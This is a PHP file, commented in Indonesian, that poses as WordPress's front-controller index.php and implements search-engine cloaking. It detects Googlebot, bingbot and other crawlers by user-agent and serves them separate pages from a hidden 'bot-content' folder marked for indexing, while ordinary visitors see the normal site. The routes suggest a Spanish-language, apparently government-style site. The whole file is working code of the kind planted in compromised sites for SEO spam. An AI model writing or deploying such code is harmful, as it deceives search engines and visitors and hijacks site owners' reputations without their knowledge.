<?php
/**
 * WordPress Cloaking System - Enhanced Version
 * Menampilkan konten berbeda untuk bot crawler dengan logging
 */

// =============================================================================
//  Konfigurasi & Logging
// =============================================================================

// Aktifkan error logging untuk debugging
error_log("=== Cloaking System Started ===");
error_log("Request URI: " . ($_SERVER['REQUEST_URI'] ?? 'unknown'));
error_log("User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown'));

// Daftar bot yang akan dideteksi
$bots = array(
    'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
    'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo',
    'YandexBot', 'Baiduspider', 'TelegramBot', 'facebookexternalhit',
    'Pinterest', 'W3C_Validator', 'Google-Site-Verification',
    'Google-InspectionTool', 'Applebot', 'AhrefsBot',
    'SEMrushBot', 'MJ12bot', 'Twitterbot', 'LinkedInBot'
);

// Path ke folder konten lokal
$content_dir = __DIR__ . '/bot-content/';

// =============================================================================
//  Fungsi-fungsi
// =============================================================================

/**
 * Deteksi apakah user-agent adalah bot
 */
function is_cloaking_bot($bots_list) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (empty($user_agent)) {
        error_log("Empty user agent - not treating as bot");
        return false;
    }
    
    foreach ($bots_list as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            error_log("Bot detected: " . $bot);
            return true;
        }
    }
    
    error_log("Not a bot - user agent: " . $user_agent);
    return false;
}

/**
 * Ambil konten dari file lokal dengan fallback
 */
function get_local_content($file_path) {
    if (file_exists($file_path) && is_readable($file_path)) {
        error_log("Loading content from: " . $file_path);
        return file_get_contents($file_path);
    }
    error_log("File not found: " . $file_path);
    return false;
}

/**
 * Tampilkan respons yang valid untuk bot
 */
function show_bot_response($content_dir) {
    $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
    $path = strtok($request_uri, '?');
    $path = rtrim($path, '/');
    
    if ($path === '') {
        $path = '/';
    }
    
    error_log("Processing path: " . $path);
    
    // Tentukan file konten berdasarkan path
    $content_file = null;
    
    // Homepage
    if ($path === '/' || $path === '/web' || $path === '/web/') {
        $content_file = $content_dir . 'index.html';
    }
    // /web/tramites-y-servicios
    elseif (strpos($path, '/web/tramites-y-servicios') === 0) {
        $content_file = $content_dir . 'tramites-y-servicios.html';
    }
    // Default fallback
    else {
        $content_file = $content_dir . 'default.html';
    }
    
    // Ambil konten
    $content = get_local_content($content_file);
    
    // Jika konten tidak ditemukan, buat konten minimal
    if (!$content) {
        error_log("No content found, generating minimal response");
        $content = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="robots" content="noindex, nofollow">
            <title>Content</title>
        </head>
        <body>
            <h1>Welcome</h1>
            <p>Content for crawlers</p>
        </body>
        </html>';
    }
    
    // Bersihkan buffer
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    // Set headers yang benar
    header('HTTP/1.1 200 OK');
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Robots-Tag: index, follow'); // Biarkan Google mengindeks
    header('Cache-Control: public, max-age=3600');
    
    echo $content;
    error_log("Bot response sent successfully");
    exit;
}

// =============================================================================
//  Eksekusi Cloaking
// =============================================================================

// Cek apakah ini request untuk bot
if (is_cloaking_bot($bots)) {
    error_log("=== SERVING BOT CONTENT ===");
    show_bot_response($content_dir);
}

// =============================================================================
//  WordPress Default Loader
// =============================================================================

error_log("=== SERVING NORMAL WORDPRESS CONTENT ===");
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
